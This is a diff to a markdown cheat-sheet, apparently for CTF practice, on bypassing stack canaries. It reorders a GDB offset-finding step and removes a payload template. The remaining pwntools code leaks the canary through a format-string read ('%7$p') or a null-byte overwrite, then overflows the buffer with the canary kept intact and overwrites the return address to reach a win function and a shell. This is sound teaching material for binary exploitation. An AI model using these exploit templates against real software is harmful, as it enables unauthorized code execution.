@@ -51,8 +51,20 @@ Get flag
 | 8 bytes (64-bit)      | 4 bytes on 32-bit                                       |
 
 ---
+# <span style="color:rgb(255, 192, 0)">STEP (1) Finding Offset to Canary (GDB)</span>
 
-### <span style="color:rgb(255, 192, 0)">Method 1 — Format String Leak</span>
+```bash
+gdb ./binary
+
+r <<< $(pwn cyclic 200)
+
+# Canary is stored at a fixed offset — look for the "stack smashing" abort
+# After abort, inspect stack:
+x/40gx $rsp                # look for value ending in 00
+```
+
+# <span style="color:rgb(255, 192, 0)">STEP (2) Pick a method</span>
+### <span style="color:rgb(255, 255, 0)">Method 1 — Format String Leak</span>
 
 If there's a `printf(buf)` vulnerability before the overflow:
 Step 1: find canary's format-string index
@@ -78,7 +90,7 @@ win = 0xdeadbeef                 # from GDB: p win  OR  info functions
 # --- Leak canary ---
 p.recvuntil(b"input: ")                  # wait for binary to ask for input before sending anything
 p.sendline(b"%7$p")                      # %<index>$p = leak one specific stack value by position
-                                         # replace 7 with whatever index you found in step 1
+                                         # REPLACE 7 with whatever index you found in step 1
 p.recvuntil(b"output: ")                 # wait for binary to print the leak — match whatever comes before the value
 canary = int(p.recvline().strip(), 16)   # recvline() grabs the hex string, int(...,16) converts to integer
 print(f"Canary: {hex(canary)}")          # sanity check — should end in 00
@@ -97,7 +109,8 @@ p.sendline(payload)
 p.interactive()                  # hand control to us — type commands if we got a shell
 ```
 
-### <span style="color:rgb(255, 192, 0)">Method 2 — Off-by-One / Partial Overwrite Leak</span>
+
+### <span style="color:rgb(255, 255, 0)">Method 2 — Null Byte Overwrite Leak</span>
 
 If the binary **prints back your buffer** (e.g. `printf(buf)` or `puts(buf)`) and there's a separate read:
 
@@ -118,41 +131,6 @@ leaked = p.recv(7)
 canary = b"\x00" + leaked[::-1]   # if little-endian reassembly needed
 # OR more commonly:
 canary = u64(b"\x00" + leaked)    # parse 7 bytes + null into 8-byte int
-```
-
-### <span style="color:rgb(255, 192, 0)">Finding Offset to Canary (GDB)</span>
-
-```bash
-gdb ./binary
-
-r <<< $(pwn cyclic 200)
-
-# Canary is stored at a fixed offset — look for the "stack smashing" abort
-# After abort, inspect stack:
-x/40gx $rsp                # look for value ending in 00
-```
-
-### <span style="color:rgb(255, 192, 0)">Payload Template (after leak)</span>
-
-```python
-from pwn import *
-
-p = process('./binary')
-# --- Step 1: leak canary ---
-# (format string or puts overflow, see above)
-canary = <leaked value>
-
-# --- Step 2: overflow with canary preserved ---
-offset_to_canary = 40          # junk before canary
-win = 0xdeadbeef               # target address
-
-payload  = b"A" * offset_to_canary
-payload += p64(canary)         # exact canary value — must match!
-payload += b"B" * 8           # saved RBP (usually don't care)
-payload += p64(win)            # return address
-
-p.sendline(payload)
-p.interactive()
 ```
 
 ### <span style="color:rgb(255, 192, 0)">Things That Go Wrong:</span>
